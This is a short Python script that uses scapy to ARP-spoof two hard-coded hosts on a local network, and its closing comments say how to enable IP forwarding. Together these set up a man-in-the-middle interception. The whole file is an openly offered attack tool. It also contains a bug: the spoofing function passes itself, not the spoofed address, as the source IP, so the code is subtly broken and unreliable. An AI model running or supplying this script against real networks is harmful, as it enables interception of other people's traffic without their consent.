#!/usr/bin/python3

# Important at bottom

import scapy.all as scapy


def restore(destination_ip, source_ip):
    target_mac = get_target_mac(destination_ip)
    source_mac = get_target_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,
                       hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


def get_target_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    finalpacket = broadcast/arp_request
    answer = scapy.srp(finalpacket, timeout=2, verbose=False)[0]
    mac = answer[0][1].hwsrc
    return(mac)


def spoof_arp(target_ip, spoofed_ip):
    mac = get_target_mac(target_ip)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoof_arp)
    scapy.send(packet, verbose=False)


def main():
    try:
        while True:
            spoof_arp("192.168.43.1", "192.168.43.205")
            spoof_arp("192.168.43.205", "192.168.43.1")

    except KeyboardInterrupt:
        restore("192.168.43.1", "192.168.43.205")
        restore("192.168.43.205", "192.168.43.1")
        exit()


if __name__ == "__main__":
    main()

# to forward a packet from your device 
# cat /proc/sys/net/ipv4/ip_forward             not forwarding packets
# echo 1 > /proc/sys/net/ipv4/ip_forward        forwarding the packets
# 